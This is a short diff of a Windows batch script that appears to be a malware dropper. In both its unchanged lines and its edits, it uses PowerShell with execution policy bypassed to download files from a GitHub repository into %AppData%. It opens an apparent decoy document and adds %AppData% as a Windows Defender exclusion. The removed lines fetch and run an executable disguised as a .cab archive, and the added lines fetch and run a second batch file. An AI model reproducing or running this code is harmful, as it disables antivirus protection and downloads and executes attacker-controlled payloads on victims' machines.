@@ -45,6 +45,6 @@
 call powershell.exe -ExecutionPolicy bypass -noprofile (New-Object System.Net.WebClient).DownloadFile('https://github.com/oxsve/f/raw/master/a.docx','%AppData%\a.docx') 
 call start %AppData%\a.docx
 call powershell.exe Add-MpPreference -ExclusionPath "%AppData%"
-call powershell.exe -ExecutionPolicy bypass -noprofile (New-Object System.Net.WebClient).DownloadFile('https://github.com/oxsve/f/blob/master/gh123124.exe','%AppData%\aaa4.cab')
-call expand %AppData%\aaa4.cab %AppData%\qfwer.exe
-call start %AppData%\qfwer.exe
+call powershell.exe -ExecutionPolicy bypass -noprofile (New-Object System.Net.WebClient).DownloadFile('https://github.com/oxsve/f/blob/master/d.bat','%AppData%\req.cab')
+call expand %AppData%\req.cab %AppData%\d.bat
+call start %AppData%\d.bat
